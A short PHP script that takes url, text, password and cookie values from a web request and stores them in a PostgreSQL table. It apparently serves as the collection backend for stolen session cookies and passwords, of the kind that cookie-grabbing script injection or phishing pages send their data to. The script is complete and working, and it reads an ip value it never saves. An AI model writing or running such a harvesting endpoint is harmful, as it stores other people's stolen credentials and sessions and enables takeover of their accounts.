<?php
ini_set('display_errors', 'On');
error_reporting(E_ALL);

include_once('dbconfig.php');

$ip=pg_escape_string($_GET['ip']);

$url=pg_escape_string($_GET['url']);

$text=pg_escape_string($_GET['text']);

$password=pg_escape_string($_GET['password']);

$cookie=pg_escape_string($_GET['cookie']);

$dbconn=pg_connect("dbname=".$config['db']." user=".$config['username']." password=".$config['password']);

$insert_query="INSERT INTO ".$config['table']."(url, text, password, cookie) VALUES('".$url."', '".$text."', '".$password."', '".$cookie."')";

$result=pg_query($dbconn, $insert_query);

pg_close($dbconn);

?>